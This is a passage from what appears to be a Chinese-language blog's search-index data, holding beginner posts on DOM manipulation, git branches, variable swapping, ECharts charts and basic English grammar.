1 return function callback() { window.scrollTo({ top: index * 4000 }) index++ }}/* 每點一下按鈕就往下滾 4000px */document.querySelector('button').onclick = scrollDown() 也可以設成這樣，就會有 smooth 的效果： 12345678910111213141516function scrollDown() { let index = 1 return function callback() { /* top: y 軸 left: x 軸 behavior: smooth, instant, auto */ window.scrollTo({ top: 4000 * index, behavior: 'smooth' }) index++ }}document.querySelector('button').onclick = scrollDown() offsetTop / offsetLeft附註：如果不知道實際 parent 是誰？可以用 offsetParent 來查詢。 找到第一個 position 非 static 的 parent 並計算距離 parent 的 padding 會計算進去 原始碼可以到 Codepen 上參考 clientWidth / clientHeight根據該元素的實際大小來計算寬與高，會包含 padding，但不包含 border 和 scrollbar。 原始碼可以到 Codepen 上參考 網址相關 window.location.reload() 重新整理目前的頁面 window.location.assign(url) 跳轉到新的頁面，會留下歷史紀錄（可以按上一頁） window.location.replace(url) 更新目前的頁面，不會留下歷史紀錄（不能按上一頁） window.location.search 查看網址的 query string","link":"/2022/01/24/dom-api/"},{"title":"DOM 清除所有的子元素","text":"在練習時碰到的問題。 方法一 innerHTML最直覺也簡單的方法，但會有效能上的問題（會觸發瀏覽器重新 parse）： 123456789101112&lt;div class=\"parent\"&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 1document.querySelector('.parent').innerHTML = '' Output： 1&lt;div class=\"parent\"&gt;&lt;/div&gt; 方法二 textContent不會觸發瀏覽器重新 parse，原理是把子元素都變成 #text： 123456789101112&lt;div class=\"parent\"&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 1document.querySelector('.parent').textContent = '' Output： 1&lt;div class=\"parent\"&gt;&lt;/div&gt; 方法三 while 迴圈 + lastChild建議從 lastChild 來刪，比較不會出現一些誤差問題： 123456789101112&lt;div class=\"parent\"&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 123456789const node = document.querySelector('.parent')removeAllChild(node)function removeAllChild(node) { while(node.firstChild) { // 只要底下有子元素就執行 node.removeChild(node.lastChild) }} Output： 1&lt;div class=\"parent\"&gt;&lt;/div&gt; 方法四 while 迴圈 + lastElementChild會留下 #text 跟 #comment 節點的方法，目的是因為早期支援要 IE 的時候會不希望把 comment 給刪除。但現在 IE 已死所以這方法比較不常用了： 123456&lt;div id='foo'&gt; &lt;!-- This comment won't be removed --&gt; &lt;span&gt;Hello &lt;!-- This comment WILL be removed --&gt;&lt;/span&gt; &lt;!-- But this one won't. --&gt;&lt;/div&gt;&lt;button id='doFoo'&gt;Remove via lastElementChild-loop&lt;/button&gt; 12345678const doFoo = document.getElementById('doFoo')doFoo.onclick = () =&gt; { const node = document.getElementById('foo') while(node.lastElementChild) { node.removeChild(node.lastElementChild) } console.log(node.childNodes)} Output： 1234&lt;div id='foo'&gt; &lt;!-- This comment won't be removed --&gt; &lt;!-- But this one won't. --&gt;&lt;/div&gt; 方法四 replaceChildren如果不傳入 node 代表刪除所有子元素，有的話則會被放進去取代： 1234&lt;div id='foo'&gt; &lt;span&gt;Hello&lt;/span&gt; &lt;p&gt;yoyoyo&lt;/p&gt;&lt;/div&gt; 123const newElem1 = document.createElement('article')const newElem2= document.createElement('section')document.getElementById('foo').replaceChildren(newElem1, newElem2) Output： 1234&lt;div id='foo'&gt; &lt;article&gt;&lt;/article&gt; &lt;section&gt;&lt;/section&gt;&lt;/div&gt; 刪除所有子元素： 1document.getElementById('foo').replaceChildren() Output： 1&lt;div id='foo'&gt;&lt;/div&gt;","link":"/2022/01/28/dom-remove-all-child/"},{"title":"DOM 清掉惱人的文字節點","text":"真的很腦耶！ 簡述假設你有段 HTML 長這樣： 12345678&lt;div class=\"block\"&gt; &lt;!-- yo --&gt; &lt;p&gt;lala la&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;aaa&lt;/p&gt; &lt;!-- yo --&gt; &lt;p&gt;bbbb&lt;/p&gt;&lt;/div&gt; 那生成 DOM 的時候會變這樣： 1234567891011121314151617DIV#text (\"\\n\\t\") -&gt; 文字節點（換行）#comment -&gt; 註解節點#text (\"\\n\\t\") -&gt; 文字節點（換行）+ P| + #text (\"lala la\") -&gt; 文字節點（p 的內容）+ #text (\"\\n\\t\") -&gt; 文字節點（換行）#comment -&gt; 註解節點#text (\"\\n\\t\") -&gt; 文字節點（換行）+ P| + #text (\"aaa\") -&gt; 文字節點（p 的內容）+ #text (\"\\n\\t\") -&gt; 文字節點（換行）#comment -&gt; 註解節點#text (\"\\n\\t\") -&gt; 文字節點（換行）+ P| + #text (\"bbbb\") -&gt; 文字節點（p 的內容）+ #text (\"\\n\\t\") -&gt; 文字節點（換行） 所以這時候如果想抓到 .block 下的第一個 &lt;p&gt;，你可能會這樣寫： 1const p = document.querySelector('.block').firstChild 但這樣會抓到的是 #text (\"\\n\\t\") 這個文字節點（空白字元），所以要這樣子才能真的找到 &lt;p&gt;： 1234567891011/* firstChild: #text (\"\\n\\t\") nextSibling: #comment nextSibling: #text (\"\\n\\t\") nextSibling: &lt;p&gt; !!! */const p = document.querySelector('.block') .firstChild .nextSibling .nextSibling .nextSibling 真的是有夠麻煩…，所以繼續往下看該怎麼解決。 通通燒毀！所以這邊寫一個 function 來把這些沒用的節點一次處理掉： 123456789101112131415161718192021222324252627282930/* cleanJunkNodes 會接收一個節點： 1. 取得該節點下的所有子節點 2. 判斷子節點的值 3. 如果是沒用的節點就刪掉*/function cleanJunkNodes (node) { // 遍歷所有子節點 for (let i=0; i&lt;node.childNodes.length; i++) { // 存取第 i 個子節點 let child = node.childNodes[i] // 如果是註解 or 文字節點（只有空白字元） if ( child.nodeType === 8 || child.nodeType === 3 &amp;&amp; !/\\S/.test(child.nodeValue) ) { // 刪除子節點 node.removeChild(child) // 往前退一格（因為長度變短了） i-- } else if (child.nodeType === 1) { // 如果子節點也是元素，丟到遞迴 cleanJunkNodes 清除垃圾節點 cleanJunkNodes(child) } }} 執行： 123// （以下兩個都可以）cleanJunkNodes(document.body)cleanJunkNodes(document) 然後就可以快樂選元素了： 1const p = document.querySelector('.block').firstChild // 真的是 &lt;p&gt; 備註一： 之所以可以這樣子做是因為傳入的節點是 Object，而 Object 被傳到 function 當作參數的時候傳的是「參考」而不是「值」，所以你才能夠在 function 裡面改變外面 Object 的值。（不懂的話去複習 理解 function 傳遞參數的機制） 備註二：關於 nodeType 的代號 1： element 9： document -&gt; 注意是 document 物件 不是 &lt;html&gt; 3： text` 8： comment 接下來你只要把上面的 function 跑一次就可以把所有不重要的元素清掉了（某種意義上很像 CSS reset？）： 備註三：關於 cleanJunkNodes 的終止條件 當一個節點下面沒有子節點時，childNodes 會回傳一個「空陣列」，這時候就不會進入迴圈條件。","link":"/2022/01/21/dom-remove-junk-nodes/"},{"title":"從資料夾來理解分支的概念","text":"分支的概念其實就跟 從自己做版控來學 Git 這篇文章很相似。我們可以用「資料夾」來模擬 Git 在建立每一個 commit 時的動作，我們也可以用「資料夾」來模擬建立分支的動作。 這個做法雖然聽起來很奇妙，但真的很好理解。 建立分支首先，你先把每一個 branch 想成是一個資料夾。 在一開始 git init 的時候會建立一個 master 資料夾（代表 master 分支）： 1234-- master（主分支） -- master_commit1（資料夾） --code --note 此時你在 master 分支上做了一些 commit 後，可能會想要開一個新的分支，假設叫做「new_feature」。所以現在你有兩個分支的資料夾： 123456789-- master（主分支） -- master_commit1（資料夾） --code --note -- master_commit2（資料夾） --code --note-- new_feature（新的分支） 接著是重點，假設 new_feature 是在 master_commit2 時新開的分支。這個時候 new_feature 就會有當時 master_commit1 跟 master_commit2 的檔案。（因為它要延續前面的版本接下去做，所以它就必須要有這個時候的所有檔案） 你也可以想成是把 master 中的所有檔案複製到 new_feature 這個資料夾中： 123456789101112131415-- master（主分支） -- master_commit1（資料夾） --code --note -- master_commit2（資料夾） --code --note-- new_feature（新的分支） -- master_commit1（資料夾） --code --note -- master_commit2（資料夾） --code --note 接著 new_feature 就可以在這條分支上繼續新增自己的 commit： 12345678910111213-- new_feature（新的分支） -- master_commit1（資料夾） --code --note -- master_commit2（資料夾） --code --note -- new_feature_commit1（資料夾） --code --note -- new_feature_commit2（資料夾） --code --note 如果到這邊你都理解的話，那恭喜你，你已經理解分支的概念是什麼了，其實就是原本的 commit 資料夾外面再多一層資料夾的概念而已。 master 資料夾（分支）中會有自己專屬的 commit 資料夾；new_feature 資料夾（分支）也會有自己專屬的 commit 資料夾。 合併分支接著要講解合併分支的情況。 沿用前面的例子，現在當 new_feature 分支上的事情做完後，你就用不到這條分支了，所以你可以把它「接回去」原本的分支（master）。 比較直覺的想法是把在 new_feature 中新增的 commit 直接接回去 master 分支上，像這樣： 123456789101112131415-- master（主分支） -- master_commit1（資料夾） --code --note -- master_commit2（資料夾） --code --note （在 new_feature 中新增的 commit） -- new_feature_commit1（資料夾） --code --note -- new_feature_commit2（資料夾） --code --note 看不懂的話可以思考一下這個流程： new_feature 是從 master_commit2 長出來的，所以在那之前的 commit 內容理論上應該都會相同，我不需要管它們。 我要做的就是把在 master_commit2 之後的 new_feature_commit 都接回去 master 上。 我知道你也許會問：「阿如果 master 上也有新的 commit3、commit4 的話勒？」。 這種時候可能就會引發「衝突（conflict）」，也就是 兩個分支都改到同一個檔案 的情況，但那是之後會再討論的事，現在只要先理解這個比較單純的狀況就行了。 總結按照慣例我們來複習一下： 每個分支都可以當成是一個資料夾 建立新的分支，可以想成是把原本分支上的檔案複製到新的分支上 每個分支上的 commit 彼此之間互不相干 把 A 分支合併到 B 分支，等於是把在 A 分支新增的 commit 接回去 B 分支的 commit 上","link":"/2021/12/12/easy-way-to-understand-branch/"},{"title":"怎麼讓一般人聽懂工程師腦裡的「交換」","text":"簡單的事情，不要想得太複雜。 簡述這篇文章是我某天腦洞突然開而想出來的，目的是希望讓沒有程式基礎的人也能理解「在程式的世界裡，把兩個東西交換」代表的意思是什麼。 說故事時間如果你沒有學過程式，那你腦袋中的「交換」應該是長這樣子： 但有學過程式的人腦中的「交換」卻是長這樣子： WTF？工程師是吸了什麼？為什麼要用這麼反人類的方式思考？在我還不懂程式的時後我也疑惑過這個問題。 但其實我們每個人都有過這種思考模式，只是沒有發現而已。所以我接下來就來解釋到底是什麼事情？ 取錯檔案名稱的慘痛不知道你有沒有這樣的經驗，像是把兩張圖片的名字取錯，像這樣： 那你該怎麼把這兩個名字交換？我相信大部分人應該是這樣子做的： （備註：我女友直接嗆說「我都直接改名稱欸，例如：『宇宙大燒賣-01』，只有你用這種做法吧」。好啦…如果你不是這樣子做的話，那你就當今天學到一種新的做法吧！） 把詳細步驟寫出來的話就是： 複製一個宇宙大燒賣，得到「宇宙大燒賣－複製」 把「宇宙大燒賣」刪除 把「黃金比例燒賣」改成「宇宙大燒賣」 最後把「宇宙大燒賣－複製」改成「黃金比例燒賣」 完成！ 為什麼要先複製一份？很簡單嘛，因為「不能有同樣的檔案名稱啊」，這個道理大家都很清楚，在寫程式的時也是一樣，只是稍微換個角度來思考而已，但背後的道理都一樣。 其實理解到這邊就差不多了，接下來的部分只是讓有興趣的人學個概念，看不懂也沒關係。 首先要知道在程式的世界裡你不能幫變數改名稱，只能改變數的值。 意思是說假設我有兩個變數： 12let picture1 = '宇宙大燒賣.jpg'let picture2 = '黃金比例燒賣.jpg' 你絕對不可能直接把 picture1 改成 picture2，你只能透過「變數值」來修改變數： 12picture1 =&gt; picture2 // 錯誤的做法picture1 = '宇宙大燒賣.jpg' // 正確的做法 所以要怎麼把兩個變數的值交換？很簡單嘛，直接「重新賦值」就好啦： 12picture1 = picture2 // 把 2 的值給 1picture2 = picture1 // 把 1 的值給 2 但這樣子是不對的，在你做 picture1 = picture2 的時候，picture1 的值就已經不是原本的值了，所以下一行 picture2 = picture1 的 picture1 會是重新賦值後的值，你仔細思考一下每個步驟就能理解意思了： 12picture1 = picture2 // picture1 的值變成 '黃金比例燒賣.jpg'picture2 = picture1 // picture2 參考的值還是 '黃金比例燒賣.jpg' 不是 '宇宙大燒賣.jpg' 那要怎麼做才是對的？用我們一開始說的「複製」大法： 123picture1_copy = picture1 // 先複製一份 '宇宙大燒賣.jpg'picture1 = picture2 // 把原本的 pictur1 改成 '黃金比例燒賣.jpg'picture2 = picture1_copy // 最後再把 picutre2 改成複製好的 '宇宙大燒賣.jpg' 這樣子做就可以避免掉剛剛的問題，正確的讓 picture2 儲存原本 picture1 的值。而這也是為什麼工程師要多繞一圈的原因。 結尾其實就是我腦袋突然想到的想法而已，我也不確定這種說法有沒有比較好理解一些，如果你覺得沒有很好理解的話那絕對是我文筆不好的問題，不是你的錯。 總之呢，就當作我隨便寫寫廢文，大家隨便看看就好。","link":"/2022/02/02/easy-way-to-understand-swap/"},{"title":"Echarts Note","text":"第一次嘗試圖表應用。 基本資料結構與觀念觀念echarts 其實就是一個幫你處理「圖表實現（implement）」 的套件，你只要依照文件上的 配置 來做設定就會自動幫你產生對應的圖表，所以你不需要花心思在「如何建立圖表」這件事情上（一個實際案例是 D3.js）。 基本配置範例1234567891011121314151617181920const option = { title: { text: '圖表的標題' }, tooltip: {}, legend: { data: ['销量'] }, xAxis: { data: ['衬衫', '羊毛衫', '雪纺衫', '裤子', '高跟鞋', '袜子'] }, yAxis: {}, series: [ { name: '销量', type: 'bar', data: [5, 20, 36, 10, 10, 20] } ]} 這邊的配置你搭配下圖一起看以後大概就能理解兩者之間的對應關係： 補充： tooltip hover 時會有 popup 顯示訊息 legend 是用來過切換單一圖表的顯示 or 隱藏（需在 series.name 設置對應名稱 ） series 主要是用來代表「資料」。也包含其他的設定，像是 type: bar 代表以柱狀圖呈現，而 name 則代表該資料的名稱，以此類推此。 最基本的配置其實就大概包含以上這些，其他的都只是往後延伸而已。當你碰到任何疑惑時，請務必參考 API Spec 來學習與練習。不需要死記硬背，當你用的多時就會慢慢記住了。 圖表尺寸圖表預設會填滿容器的寬與高，例如： 1234.wrapper { width: 400px; height: 400px;} 123456789101112131415161718192021222324252627282930313233343536import * as echarts from 'echarts'import { useEffect, useRef } from 'react'const option = { title: { text: '圖表的標題' }, tooltip: {}, legend: { data: ['銷量'] }, xAxis: { data: ['衬衫', '羊毛衫', '雪纺衫', '裤子', '高跟鞋', '袜子'] }, yAxis: {}, series: [ { name: '銷量', type: 'bar', data: [5, 50, 36, 10, 10, 20] } ]}function App() { const chartWrapper = useRef(null) useEffect(() =&gt; { const myChart = echarts.init(chartWrapper.current) myChart.setOption(JSON.parse(JSON.stringify(option))) }, []) return &lt;div ref={chartWrapper} className='chat-wrapper'&gt;&lt;/div&gt;}export default App 這樣子圖表就會是 400x400 的大小。 自動調整大小如果要手動調整圖表大小的話，可以用在 init 時加上 config： 1234const myChart = echarts.init(chartWrapper.current, null, { width: 600, height: 600}) 如果要隨視窗改變時調整大小的話，可以用在 window.onResize 時呼叫chart.resize() 來改變圖表大小： 123456789window.onresize = () =&gt; { const myChart = echarts.init(chartWrapper.current) myChart.setOption(JSON.parse(JSON.stringify(option))) // 根據 body 的寬高來調整大小 myChart.resize({ width: document.body.clientWidth - 20, height: document.body.clientHeight - 20 })} 圖表樣式設定樣式的方法是透過在 option 中做設定，可以設定在「global」或「series」身上。 1234567891011121314151617181920212223242526const option = { // global color: ['#003366', '#006699', '#4cabce'], legend: { orient: 'vertical', top: 'center', right: 0 }, dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 43.3, 85.8, 93.7], ['Milk Tea', 83.1, 73.4, 55.1], ['Cheese Cocoa', 86.4, 65.2, 82.5], ['Walnut Brownie', 72.4, 53.9, 39.1] ] }, xAxis: { type: 'category' }, yAxis: {}, series: [ { type: 'bar' }, { type: 'bar' }, // series 會覆蓋掉 global 的設定 { type: 'bar', color: 'red' } ]} DatasetDataset 是一種「設定資料」的方式，官方沒有規定你一定要這樣子做，不過這樣子做會為你帶來一些好處，像是提高可重用性、資料格式會更好閱讀等等。 先來看一下原本的寫法： 123456789101112131415161718192021222324252627const option = { xAxis: { type: 'category', data: ['Matcha Latte', 'Milk Tea', 'Cheese Cocoa', 'Walnut Brownie'] }, yAxis: { type: 'value', position: 'right' }, series: [ { name: '2015', type: 'bar', data: [89.3, 92.1, 94.4, 85.4] }, { name: '2016', type: 'bar', data: [95.8, 89.4, 91.2, 76.9] }, { name: '2017', type: 'bar', data: [97.7, 83.1, 92.5, 78.1] } ]} 改用 Dataset 的形式來寫會變這樣： 123456789101112131415161718192021const option = { tooltip: {}, xAxis: { type: 'category' }, yAxis: { type: 'value', position: 'right' }, // 可以 \"直排\" 的方式來看會更好理解 dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 89.3, 92.1, 94.4, 85.4], ['Milk Tea', 95.8, 89.4, 91.2, 76.9], ['Cheese Cocoa', 97.7, 83.1, 92.5, 78.1], ['Walnut Brownie', 66.7, 75.1, 88.5, 69.1] ] }, series: [{ type: 'bar' }, { type: 'bar' }, { type: 'bar' }]} 我覺得這樣寫的另一個好處是「把資料抽離」，現在所有跟資料有關的東西都只放在 dataset.source 裡，而 series 的職責只剩下呈現方式。換句話說就有點像是把資料從畫面上抽離出去的感覺。 總之這兩種的輸出結果都會一樣： 座標軸（Axis）這邊是想讓你理解底下的配置項目分別代表什麼： xAxis X 軸 yAxis Y 軸 axisLine 座標軸的「線」 axisTick 座標軸的「刻度」 搭配官方的這張圖我覺得應該就很好懂了。 現在如果我想調 X 軸的「刻度」顏色，我可以這樣配置： 1234567891011121314151617181920212223242526const option = { xAxis: { name: 'products', type: 'category', axisTick: { length: 10, lineStyle: { color: 'red' } } }, yAxis: { name: 'sales', type: 'value' }, dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 89.3, 92.1, 94.4, 85.4], ['Milk Tea', 95.8, 89.4, 91.2, 76.9], ['Cheese Cocoa', 97.7, 83.1, 92.5, 78.1], ['Walnut Brownie', 66.7, 75.1, 88.5, 69.1] ] }, series: [{ type: 'bar' }, { type: 'bar' }, { type: 'bar' }]} 其他像「軸線標題」、「軸線文字」和「軸線標籤」的改法也是以此類推。 圖例（legend）圖例可以想成是每一筆資料的標題，常見的用途是拿來切換顯示 / 隱藏某筆資料： 底下會介紹幾個我覺得開發上可能會用到的設定。 設定圖例的位置 12345678910111213141516171819const option = { legend: { orient: 'vertical', top: 'center', right: 0 }, dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 43.3, 85.8, 93.7], ['Milk Tea', 83.1, 73.4, 55.1], ['Cheese Cocoa', 86.4, 65.2, 82.5], ['Walnut Brownie', 72.4, 53.9, 39.1] ] }, xAxis: { type: 'category' }, yAxis: {}, series: [{ type: 'bar' }, { type: 'bar' }, { type: 'bar' }, { type: 'bar' }]} 設定不同的圖例 12345678910111213141516171819202122232425262728293031const option = { legend: { data: [ { name: '2015', icon: 'rect' // 第一個 }, { name: '2016', icon: 'circle' // 第二個 }, { name: '2017', icon: 'diamond' // 第三個 } ] }, dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 43.3, 85.8, 93.7], ['Milk Tea', 83.1, 73.4, 55.1], ['Cheese Cocoa', 86.4, 65.2, 82.5], ['Walnut Brownie', 72.4, 53.9, 39.1] ] }, xAxis: { type: 'category' }, yAxis: {}, series: [{ type: 'bar' }, { type: 'bar' }, { type: 'bar' }, { type: 'bar' }]} 設定預設隱藏 / 顯示 123456789101112131415161718192021const option = { legend: { selected: { 2015: false, 2016: true, 2017: true } },, dataset: { source: [ ['product', '2015', '2016', '2017'], ['Matcha Latte', 43.3, 85.8, 93.7], ['Milk Tea', 83.1, 73.4, 55.1], ['Cheese Cocoa', 86.4, 65.2, 82.5], ['Walnut Brownie', 72.4, 53.9, 39.1] ] }, xAxis: { type: 'category' }, yAxis: {}, series: [{ type: 'bar' }, { type: 'bar' }, { type: 'bar' }, { type: 'bar' }]}","link":"/2022/11/02/echarts-note/"},{"title":"基礎英文文法","text":"前言其實原本是計畫寫成一篇一篇的教學系列文，不過後來發現其實英文要學的東西出乎意料的多！所以，我想覺得改用這種像是懶人包的方式應該會比較適合。 這裡會把一些英文的基本知識，或是你可能看過的一些英文用法，全部集合成一篇可能比較簡單的資料集合， 不過要先提醒各位，這篇文章基本上就是筆記取向，以簡單快速為主，所以想深入了解的話，還是要請各位自己在多找一些資料來輔助。 另外為了呼應這個文章的標題，沒有錯，只要我看到什麼新的知識，就會更新這篇文章的內容，所以可能會時常更新也說不定。 總之，如果你想快速的查一些基本的概念，這裡應該是個不錯的地方，但如果你追求的是一刀未剪，那我想這裡可能就不太適合你囉。 導覽 語態 先行詞 同位語 指示代名詞 各種連接詞種類 動狀詞 及物動詞 / 不及物動詞 連綴動詞 使役動詞 關於長句 對等連接詞 動名詞 / 原形動詞放在句首 關於子句 will 與 be going to 差異 either 的各種用法 as 的各種用法 as if since 的各種用法 Consider 的用法 If I were … 如果我… Rather than 語態主動語態主詞是動作的「發起者」 主詞 + 動詞 I made a mistake.我犯了一個錯誤。 I create a robot.我製造了一個機器人。 被動語態主詞是動作的「承受者」 be + 過去分詞 This story was written by me.這個故事是我寫的。 This dishes was made by me.這道料理是我做的。 補充－不及物動詞的被動語態 be + 動詞 + 介係詞 + by He consented to the proposal.（主動）他同意這項建議。 The proposal was consented to by him（被動）這個建議被他同意 A car ran over a dog.（主動）一台車輾過了一隻狗 A dog was run over by a car.（被動）一隻狗被一台車輾過 先行詞被代名詞所代替的詞也可以這樣記：用來代替在前面先出現的那個主詞 or 名詞 Jim lost his data. Jim 弄丟了它的資料 Jim lost his data 先行詞 動詞 代名詞 名詞 The handsome man who had his wallet stole, was in shock. 那個錢包被偷走的帥哥嚇壞了。 The handsome man who had his wallet stole, was in shock 先行詞 代名詞（關係代名詞） 關係子句 參考資料實用基礎文法（先行詞） 同位語用來幫前面出現的名詞、代名詞、名詞片語作補充說明同位語本身是個名詞 or 名詞片語 可以再分成： 限定同位語（必要資訊、不可省略） 非限定同位語（補充額外資訊、以逗號隔開） （大致上跟限定關代、非限定關代是同個概念，參考這裡） 限定同位語 We Taiwanese are diligent in our work.我們台灣人勤奮工作。 Eve made the decison that she will move to Canada next year.Eve 決定她明年要搬去加拿大。 非限定同位語 This is my son, Jack.這是我的兒子，傑克。 I usually have lunch at Mcdonald’s, my favorite restaurant nearby.我通常在麥當勞吃午餐，這附近我最喜歡的餐廳。 參考資料實用基礎文法（同位語）英文中的「同位語」是什麼？還分限定跟非限定？ 指示代名詞可以當主詞 or 受詞 this that these those 這個 那個 這些 那些 This is the one I want.這個就是我想要的。 That is my girlfriend.這是我的女朋友。 These are my families.這些是我的家人。 Those are his brothers.那些是他的兄弟。 參考資料實用基礎文法（指示代名詞） 反身代名詞當主詞跟受詞相同時，可以用反身代名詞當作受詞 受格 + self / selves 單數 myself yourself herself himself itself I taught myself to program.我自學編程 複數 ourselves yourselves themselves by + 反身代名詞有表示獨自的意思 Jim finished the work by himself.Jim 獨自完成這個工作。 Karen prefers to live by herself.Karen 比較喜歡自己一個人住。 I prepared a big meal by myself.我自己準備了豐盛的一餐。 參考資料實用基礎文法（反身代名詞）英文簡單學 – 強調”自己”的反身代名詞｜ EF ENGLISH LIVE 部落格 各種連接詞種類連接詞可以分成： 對等連結詞 從屬連接詞 配對連接詞 除了這些以外： 關係代名詞 連接副詞 也有連接子句的功能。 對等連接詞（兩端都要長一樣） and → 和 but → 也不（沒） or → 或者 nor → 配合前面的否定語義 for → 因為 so → 所以 yet → 然而 可以用來連接句子中的： 字 片語 子句 需要注意：連接詞連接的兩端必須要是相等的。 「字」要對「字」、「片語」要對「片語」、「子句」要對「子句」。 例如： Edward is kind and courageous. （形容詞） She is a loving mother and a loyal firend.（片語） Betty lived life fully and completely（副詞） 利用對等連接詞結合獨立子句（變成合句）前面的獨立子句通常會跟著一個『,』，然後才是對等連接詞，連接後面的獨立子句。 例子： I woke up early, and I drank a coffee.我很早起床，而我喝了一杯咖啡。 She study hard, but she doesn’t pass the test.她很認真學習，但她並沒有通過測試。 We can go to a restaurant, or we can just eat leftovers.我們可以去餐廳吃飯，或我們也可以只吃剩飯。 Be here on time, or we’ll leave without you.準時到這裡，否則我們就丟下你一個。 I never see him again, nor did I regret it.我再也沒有見到他，我也沒有後悔。 I couldn’t stay, for the room was too noisy.我沒有辦法留下，因為房間太吵了。 It was raining, so I took my umbrella.因為下雨，所以我帶了傘。 It is good, yet it could be improved.這很好，但它還是可以被改善。 從屬連接詞 as → 由於 although → 雖然 because → 因為 until → 直到 Even though → 雖然 in order → 為了 since → 由於 while → 當、然而 whereas → 而 when → 當、既然 if → 如果 whenever → 無論在哪裡、無論在什麼情況下 從屬子句不一定要放在獨立子句後面，放在前面的時有更加強調的語意 I got the airport almost too late to catch my flight even though I left home early.我差點趕不上班機（強調），即便我很早就出門了。 Even though I left home early, I got the airport almost too late to catch my flight.即便我很早就出門了（強調），但還是趕不上班機。 Since I was a child, I have wanted to visit Japan.在我還小的時候（強調），我就想要去日本。 I have wanted to visit Japan since I was a child.我早就想去日本了（強調），在我還小的時候。 配對連接詞 either… or → 不是 A 就是 B not only… but also → 不但… 而且 as… so → 只要… 就會 whether… or→ 不論…或 neither… nor→ 既不是 A 也不是 B both… and→ A 和 B 兩者都… so… that→ 如此… 以至於 not so much… as → 與其說 A… 不如說 B 例子： Either June or Bob knows where she went.不是 June 就是 Bob 知道她的去向。 Neither Alex nor Alice knew the whole truth.Alex 和 Alice 都不知道真相。 Both Nancy and I went to the moive.Nancy 和我都去看電影了。 Larry was so busy that he didn’t have time to eat lunch.Larry 忙得沒有時間吃午餐。 It doesn’t matter whenever he is rich or poor, I will marry him.不論他富有還是貧困，我都會嫁給他。 I am not so much angry as sad.與其說我是生氣，不如說是難過。 參考資料實用基礎文法（連結詞）實用基礎文法（對等連結詞）【你的句子有幾個字】拉長句子的妙方：子句 連綴動詞如果連綴這個詞聽起來很饒口那告訴你一個小故事： 古時候我們衣服破掉的時候，都會用「補綴」這個詞來表示「修補衣服」，而連綴動詞後面接的形容詞又有「補語」的功能， 所以才會有「綴」這個詞的由來。 當然，你也能順便記一下，連綴動詞後面可以接補語來修飾主詞這件事。 作用與特性主詞 + 連綴 + 形容詞 → 代表修飾 S。主詞 + 連綴 + 名詞 → 代表 S = 名詞。 一種沒有動作的動詞 不能接受詞（因為不及物） 補語為一個名詞或形容詞的單字、片語、子句 例如： I am an engineer.我是一個工程師。 I am an engineer 主詞 連綴動詞（be） 名詞片語（不定冠詞 + 名詞） 我 是 一個工程師 我 = 工程師 He is capable.他很有能力。 He is capable 主詞 連綴動詞（be） 形容詞 他 很有能力（修飾） 比較特別的案例（口語 vs 文法） Don’t blame Him. It was “I” who woke you from a sound sleep. Don’t blame Him. It was “me” who woke you from a sound sleep. 從語法上來說，使用 I 才是正確的，但我們其實口語上你一定是碰到 me 的情況比較多。而之所以要使用 I，是因為這從結構來看的話這個句子會是這樣子： It was I 主詞 連綴動詞（be） 名詞 It（把你從睡夢中吵醒的人） 是 I（我） 還記得連綴動詞的結構嗎？ → 主詞 + 連綴動詞 + 名詞/形容詞在這個例子中，me 是一個受詞，而 I 才是名詞，所以從文法上來說才會必須要你用 I 而不是 me。 使役動詞主動語態DEF : 命令他人、指使他人「做」某件事 make 強迫某人做某事 have 交付某人任務、叫某人做事 let 讓某人做事 get 說服某人做事、叫某人做事 基本結構： 使役動詞 + 受詞 + 原形動詞 My mom made me study hard.我媽強迫我認真學習 My parent have us clean our rooms once a week.爸媽叫我們每周整理一次房間。 I let my girlfriend stay with me.我讓我女友陪伴我 get 需使用 get + 受詞 + to + 原形動詞的結構The custome got the clerk to wrap up the present for him.客人叫店員幫她包裝禮物 被動語態 make / have / get + 受詞 + 過去分詞 let + 受詞 + be + 過去分詞 we have our office cleaned every weekend.我們安排辦公室每周都被打掃 How could you let your mother be insulted like that?你怎麼能讓你媽媽如此受辱？ The accident got Kevin fired.這場意外讓 Kevin 被炒魷魚 與使役類似的動詞 need 需要某人做某事 want 想要某人做某事 ask 請求某人做某事 tell 告訴某人做某事 結構：動詞 + 受詞 + to + 原形動詞（不定詞） My boss wants me to fix the bug tomorrow.老闆要我明天修好 bug My gf asked me to take her home tomorrow.我女友請我明天載她回家 參考資料多益必考：使役動詞-make、have、let、get-用法大解析！ 來點不一樣的，連綴動詞 + like + 名詞基本上要跟感官類的連綴動詞一起用 look 看起來 sound 聽起來 smell 聞起來 taste 吃起來 feel 感覺起來 例子： This robot looks like a dog.這個機器人看起來像隻狗 She sounds like unhappiness.他聽起來不太開心 The room smells like a trash.那個房間聞起來像垃圾 This food taste like pot sticker.這個食物吃起來像鍋貼 I feel like a loser.我感覺像個輸家 參考資料實用基礎文法（連綴動詞）英文「連綴動詞」讓你描述「感受」更貼切 - 空中美語讓你精準描述的超級好幫手－－連綴動詞&lt; 動狀詞動狀詞不是動詞 動名詞（-ing） → 名詞 分詞（現在 -ing / 過去 -ed) → 形容詞 不定詞 → 名詞、形容詞、副詞 及物動詞 / 不及物動詞及物動詞一定接受詞 S + V + O She cleaned the room.她打掃了房間 錯誤示範How was the concert?演唱會如何？ It was good. I enjoyed very much.(X) It was good. I enjoyed it very much.(O)很不錯，我很喜歡它。 不及物動詞不接受詞，不然就是介係詞 + 受詞 S + V S + V + Prep + O Who cares.誰在乎。 錯誤示範Wait me.(X) Wait for me.(O)等窩啦 參考資料實用基礎文法（及物動詞）實用基礎文法（不及物動詞） 